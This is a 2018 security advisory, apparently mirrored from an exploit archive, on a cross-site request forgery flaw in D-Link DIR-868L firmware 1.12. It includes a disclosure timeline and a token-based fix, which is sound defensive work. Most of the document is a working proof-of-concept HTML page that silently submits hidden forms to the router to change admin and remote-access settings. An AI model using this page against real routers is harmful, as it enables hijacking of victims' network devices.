@@ -1,0 +1,197 @@
+id: 30319
+date: 05/09/2018
+title: D-Link DIR-868L 1.12 Cross Site Request Forgery Vulnerability
+author: Siddhartha Tripathy
+cves: 
+
+=======================================================================
+              title: Cross Site Request Forgery
+            product: DIR-868L
+ vulnerable version: 1.12
+      fixed version: 1.20B01 
+             impact: Medium
+           homepage: http://www.dlink.com/
+              found: 2018-02-18
+                 by: S. Tripathy 
+
+=======================================================================
+
+Vendor description:
+-------------------
+"Founded in 1986, D-Link is a global leader in the design, manufacture and marketing of advanced networking, broadband, digital, 
+voice and data communications solutions. Following our company motto, aBuilding Networks for Peoplea, D-Link continually meets 
+the global networking and connectivity needs of digital home consumers, small office professionals, small to medium-sized businesses, 
+and enterprise environments."
+
+Source: http://www.dlink.com.sg/about-d-link/
+
+User recommendation:
+------------------------
+It's recommended to the user's not to open/use any other URL/Webpage while working on the administration page of DLink DIR-868L router.
+
+
+Vulnerability overview/description:
+-----------------------------------
+1) Cross Site Request Forgery
+
+An attacker can use cross-site request forgery vulnerability to perform arbitrary web requests with the identity of the victim 
+without being noticed by the victim.
+
+
+Proof of concept:
+-----------------
+1) Cross Site Request Forgery
+
+A malicious HTML file can be hosted in an attacker's controlled server, once an authenticated victim vists the malicious website/URL,
+the payload will get executed, and some actions will be performed, such as changing the administration password in the worst case. 
+
+Example of an malicious HTML file: 
+(The following CSRF PoC can be used to change some router settings and can be modified to change the Admin password)
+
+====================================================================================================================
+<!DOCTYPE html><html><head>
+<title> D-Link CSRF</title>
+<script type="text/javascript">
+function exec1()
+{
+document.getElementById('form1').submit();
+setTimeout(exec2, 3000);
+}
+function exec2()
+{
+document.getElementById('form2').submit();
+}
+window.onbeforeunload=function(){
+return "please wait";
+}
+</script>
+</head><body>
+<h3> Your D-Link Device Settings Has Been Changed</h4>
+<body onload="exec1();" >
+<form id="form1" target="if1" action="http://192.168.0.1/hedwig.cgi" method="POST" enctype="text/plain">
+<input type="hidden" name="<?xml version" value=""1.0" encoding="UTF-8"?>
+<postxml>
+<module>
+	<service>DEVICE.ACCOUNT</service>
+	<device>
+		<gw_name>DIR-868L</gw_name>
+		
+		<account>
+			<seqno>1</seqno>
+			<max>2</max>
+			<count>1</count>
+			<entry>
+				<uid>USR-</uid>
+				<name>Admin</name>
+				<usrid/>
+				<password/>
+				<group>0</group>
+				<description/>
+			</entry>
+		</account>
+		<group>
+			<seqno/>
+			<max/>
+			<count>0</count>
+		</group>
+		<session>
+			<captcha>0</captcha>
+			<dummy/>
+			<timeout>180</timeout>
+			<maxsession>128</maxsession>
+			<maxauthorized>16</maxauthorized>
+		</session>
+	</device>
+</module>
+<module>
+	<service>HTTP.WAN-1</service>
+	<inf>
+		<web></web>
+		<https_rport></https_rport>
+		<stunnel>0</stunnel>
+		<weballow>
+			<hostv4ip/>
+		</weballow>
+		<inbfilter/>
+	</inf>
+	
+</module>
+<module>
+	<service>HTTP.WAN-2</service>
+	<inf>
+		<active>0</active>
+		<nat>NAT-1</nat>
+		<web/>
+		<weballow>
+			<hostv4ip/>
+		</weballow>
+	</inf>
+	
+</module>
+<module>
+	<service>INBFILTER</service>
+	<acl>
+		<inbfilter>		
+						<seqno>1</seqno>
+			<max>24</max>
+			<count>0</count>
+
+		</inbfilter>		
+	</acl>
+	<ACTIVATE>ignore</ACTIVATE>
+<FATLADY>ignore</FATLADY><SETCFG>ignore</SETCFG></module>
+<module>
+	<service>SHAREPORT</service>
+	<FATLADY>ignore</FATLADY>
+	
+<ACTIVATE>ignore</ACTIVATE></module>
+<module>
+	<FATLADY>ignore</FATLADY>
+	<SETCFG>ignore</SETCFG>
+	<service>SAMBA</service>
+</module>
+</postxml>" />
+</form>
+<form id="form2" target="if2" action="http://192.168.0.1/pigwidgeon.cgi" method="POST">
+<input type="hidden" name="ACTIONS" value="SETCFG,SAVE,ACTIVATE" />
+</form>
+<iframe name="if1" style="display: hidden=" width="0" height="0" frameborder="0" ></iframe>
+<iframe name="if2" style="display: hidden=" width="0" height="0" frameborder="0"></iframe>
+</body></html>
+====================================================================================================================
+
+
+Vulnerable / tested versions:
+-----------------------------
+The following version is affected by the identified vulnerability which 
+was the most recent version at the time of discovery:
+ 
+
+Wireless AC1750 Dual Band Gigabit Cloud Router: DIR-868L
+
+
+Vendor contact timeline:
+------------------------
+2018-02-18: Contacting vendor through support page
+2018-02-21: Vendor shared the contact detials with email encrytion key. 
+2018-02-21: Reported the Vulnerability
+2018-04-19: Vendor Released a Patch
+
+
+
+Solution:
+---------
+Each request that performs write access or changes the state of the application must be outfitted with a shared secret (token). 
+It can be implemented by using a hidden field inside the form used to perform the sensitive action or inside a custom header field. 
+The shared secret is stored into the session of the user on the server side to compare it against the value sent with the request. 
+Each request that does not match the corresponding shared secret must be ignored.
+
+
+Workaround:
+-----------
+---
+
+
+EOF Siddhartha Tripathy / @2018
+
+#  0day.today [2023-03-24]  #
